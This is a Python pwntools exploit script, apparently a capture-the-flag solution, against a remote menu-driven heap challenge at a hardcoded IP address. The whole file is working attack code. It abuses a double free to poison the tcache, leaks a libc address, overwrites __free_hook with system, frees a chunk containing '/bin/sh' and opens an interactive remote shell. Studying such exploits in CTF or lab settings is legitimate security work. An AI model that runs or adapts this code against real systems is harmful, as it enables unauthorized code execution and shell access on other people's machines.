from pwn import *
import sys

HOST = 0
PORT = 0
#io=process('./chall',env = {"LD_PRELOAD" : "./libc.so.6"})

io = remote("13.233.104.112",1111)

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)
s = lambda a : io.send(a)


def add(size,data):
    sla("Choice >> ","1")
    sla("Enter size >> ",str(size))
    sla("Enter data >> ",data)

def free(idx):
    sla("Choice >> ","3")
    sla("Enter index >> ",str(idx))

def view(idx):
    sla("Choice >> ","2")
    sla("Enter index >> ",str(idx))

if __name__=="__main__":
    add(0xa0,"a"*10)
    add(0x60,"b"*10)
    for i in range(8):
        free(0)
    view(0)
    reu("You data:\n")
    leak = u64(re(6) + "\x00\x00") - 0x3ebca0
    log.info("libc @ "+str(hex(leak)))
    free(1)
    free(1)
    free(1)
    hook = leak + 0x3ed8e8
    system = leak + 0x4f4e0
    add(0x60,p64(hook))
    add(0x60,"/bin/sh\x00")
    add(0x60,p64(system))
    free(3)
    #gdb.attach(io)
    io.interactive()
